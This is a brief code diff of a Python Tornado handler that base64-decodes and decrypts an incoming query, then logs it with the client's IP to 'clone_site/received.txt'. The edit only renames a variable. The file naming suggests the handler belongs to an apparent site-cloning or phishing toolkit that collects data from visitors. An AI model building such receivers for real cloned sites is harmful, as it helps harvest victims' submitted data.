@@ -194,8 +194,8 @@ class SPQ(tornado.web.RequestHandler):
         if not query:
             return
 
-        query_output = base64.b64decode(query)
-        query_output = cipher.decrypt(query_output)
+        query = base64.b64decode(query)
+        query_output = cipher.decrypt(query)
         with open("clone_site/received.txt", "w") as fh:
             fh.write('=-=-=-=-=-=-=-=-=-=-=\n(CLIENT: {})\n{}'.format(remote_ip, str(query_output)))
 
